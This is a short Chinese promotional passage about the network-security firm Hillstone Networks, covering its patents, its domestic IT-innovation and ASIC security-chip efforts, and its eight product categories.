现阶段，山石网科掌握30项自主研发核心技术，申请540多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及边界安全、云安全、数据安全、业务安全、内网安全、智能安全运营、安全服务、安全运维等八大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
